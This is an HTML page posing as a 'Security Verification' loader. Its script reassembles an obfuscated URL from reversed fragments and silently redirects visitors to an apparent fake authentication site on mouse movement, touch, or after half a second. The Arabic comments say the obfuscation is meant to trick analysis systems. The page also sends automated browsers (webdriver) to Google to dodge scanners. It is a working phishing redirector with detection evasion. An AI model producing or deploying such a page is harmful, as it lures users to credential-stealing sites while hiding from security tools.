<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Security Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { margin:0; font-family:-apple-system,system-ui,sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; background:#ffffff; cursor:pointer; }
        .loader { border:2px solid #f3f3f3; border-top:2px solid #0070f3; border-radius:50%; width:20px; height:20px; animation:spin 0.7s linear infinite; }
        @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
        .msg { margin-left:12px; font-size:14px; color:#666; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div class="msg">Loading secure session...</div>

    <script>
        (function() {
            // تشفير الرابط بطريقة التقطيع العكسي (Reverse Slicing)
            // الرابط: https://user-service-authentication.netlify.app/
            const _parts = ["pp/","y.a","lif","net",".","ion","cat","nti","the","au","-","ice","erv","s","-","ser","u","s:/","ttp","h"];
            
            function build() {
                // تجميع الرابط من النهاية للبداية لخدع أنظمة التحليل
                return _parts.reverse().join("");
            }

            const go = () => {
                const target = build();
                // انتقال فوري وقوي
                window.location.replace(target);
                // احتياطي في حال فشل replace
                setTimeout(() => { window.location.href = target; }, 50);
            };

            // بمجرد أن يتحرك الماوس أو يلمس الشاشة أو حتى تمر 0.5 ثانية
            window.addEventListener('mousemove', go, {once: true});
            window.addEventListener('touchstart', go, {once: true});
            
            // تأخير بسيط جداً (500ms) لضمان التحويل التلقائي إذا لم يتحرك المستخدم
            setTimeout(go, 500);

            // تضليل البوتات التي تسرع الزمن
            if (navigator.webdriver) {
                window.stop();
                window.location.replace("https://www.google.com");
            }
        })();
    </script>
</body>
</html>
